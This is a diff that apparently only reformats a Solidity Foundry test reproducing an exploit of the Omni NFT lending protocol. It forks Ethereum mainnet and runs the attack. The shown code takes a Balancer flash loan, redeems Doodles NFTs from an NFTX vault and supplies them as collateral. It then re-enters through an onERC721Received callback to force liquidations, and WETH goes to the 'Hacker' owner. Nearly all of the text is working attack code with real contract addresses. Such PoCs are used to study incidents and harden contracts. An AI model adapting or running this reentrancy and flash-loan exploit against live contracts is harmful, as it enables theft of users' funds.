@@ -7,11 +7,10 @@ import "./interface.sol";
 // Credit: SupremacyCA, the poc rewritten from SupremacyCA.
 
 contract ContractTest is DSTest {
-
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
     IDOODLENFTXVault doodleVault = IDOODLENFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
-    IBalancerVault  balancer   = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IERC721 doodles = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
     ISushiSwap router = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
     IOmni pool = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
@@ -20,7 +19,7 @@ contract ContractTest is DSTest {
     uint256 private nonce;
     address private immutable owner;
     address private _lib;
-    bytes32 constant private RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    bytes32 private constant RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");
 
     modifier onlyOwner() {
         require(msg.sender == owner, "Not your biz!");
@@ -28,12 +27,11 @@ contract ContractTest is DSTest {
     }
 
     constructor() {
-        cheats.createSelectFork("mainnet", 15114361); // fork mainnet at block 15114361
-        owner = msg.sender;       // Hacker
-
+        cheats.createSelectFork("mainnet", 15_114_361); // fork mainnet at block 15114361
+        owner = msg.sender; // Hacker
     }
 
-    function testExploit() public{
+    function testExploit() public {
         payable(address(0)).transfer(address(this).balance);
         emit log_named_uint("Before exploiting, ETH balance of attacker:", address(this).balance);
         address[] memory tokens = new address[](1);
@@ -45,12 +43,7 @@ contract ContractTest is DSTest {
         balancer.flashLoan(address(this), tokens, amounts, "");
     }
 
-    function receiveFlashLoan(
-        address[] memory,
-        uint256[] memory,
-        uint256[] memory,
-        bytes memory
-    ) external {
+    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
         require(msg.sender == address(balancer), "You are not a market maker for Flash Loan!");
         doodle.approve(address(doodle), type(uint256).max);
         doodles.setApprovalForAll(address(doodle), true);
@@ -89,7 +82,7 @@ contract ContractTest is DSTest {
         _specificIds[17] = 720;
         _specificIds[18] = 5251;
         _specificIds[19] = 7425;
-        
+
         doodleVault.redeem(20, _specificIds);
 
         require(doodles.balanceOf(address(this)) >= 20, "redeem error.");
@@ -105,11 +98,11 @@ contract ContractTest is DSTest {
         for (uint256 i = 0; i < length; i++) {
             doodles.transferFrom(address(this), address(_lib), _specificIds[i]);
         }
-        
+
         lib.joker();
 
         uint256[] memory _amount = new uint256[](20);
- 
+
         for (uint256 j = 0; j < _amount.length; j++) {
             _amount[j] = 0;
         }
@@ -120,17 +113,11 @@ contract ContractTest is DSTest {
 
         uint256 profit = getters();
         emit log_named_uint("After exploiting, ETH balance of attacker:", address(this).balance);
-   
-        return RETURN_VALUE;
 
+        return RETURN_VALUE;
     }
 
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes calldata
-    ) external returns (bytes4) {
+    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
         if (msg.sender == NToken) {
             if (nonce == 21) {
                 nonce++;
@@ -138,7 +125,6 @@ contract ContractTest is DSTest {
                 pool.liquidationERC721(address(doodles), address(WETH), address(_lib), 7425, 100 ether, false);
                 return this.onERC721Received.selector;
             } else if (nonce == 22) {
-
                 uint256[] memory _specificIds = new uint256[](3);
                 _specificIds[0] = 720;
                 _specificIds[1] = 5251;
@@ -218,11 +204,9 @@ contract ContractTest is DSTest {
     }
 
     receive() external payable {}
-
 }
 
 contract Lib {
-
     address private immutable exp;
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
@@ -297,13 +281,13 @@ contract Lib {
         _params[6].useAsCollateral = true;
 
         _params[7].tokenId = 1603;
-        _params[7].useAsCollateral = true;       
+        _params[7].useAsCollateral = true;
 
         _params[8].tokenId = 4510;
-        _params[8].useAsCollateral = true;       
+        _params[8].useAsCollateral = true;
 
         _params[9].tokenId = 6932;
-        _params[9].useAsCollateral = true;     
+        _params[9].useAsCollateral = true;
 
         _params[10].tokenId = 1253;
         _params[10].useAsCollateral = true;
@@ -312,28 +296,28 @@ contract Lib {
         _params[11].useAsCollateral = true;
 
         _params[12].tokenId = 9403;
-        _params[12].useAsCollateral = true;  
+        _params[12].useAsCollateral = true;
 
         _params[13].tokenId = 1067;
-        _params[13].useAsCollateral = true;     
+        _params[13].useAsCollateral = true;
 
         _params[14].tokenId = 179;
-        _params[14].useAsCollateral = true;       
+        _params[14].useAsCollateral = true;
 
         _params[15].tokenId = 4017;
-        _params[15].useAsCollateral = true;        
+        _params[15].useAsCollateral = true;
 
         _params[16].tokenId = 7165;
-        _params[16].useAsCollateral = true;      
+        _params[16].useAsCollateral = true;
 
         _params[17].tokenId = 720;
-        _params[17].useAsCollateral = true;                 
+        _params[17].useAsCollateral = true;
 
         _params[18].tokenId = 5251;
-        _params[18].useAsCollateral = true;      
+        _params[18].useAsCollateral = true;
 
         _params[19].tokenId = 7425;
-        _params[19].useAsCollateral = true;            
+        _params[19].useAsCollateral = true;
 
         pool.supplyERC721(address(doodles), _params, address(this), 0);
 
@@ -374,14 +358,9 @@ contract Lib {
         WETH.transfer(address(exp), balance);
 
         return true;
-    } 
+    }
 
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes calldata
-    ) external pure returns (bytes4) {
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
         return this.onERC721Received.selector;
     }
 }
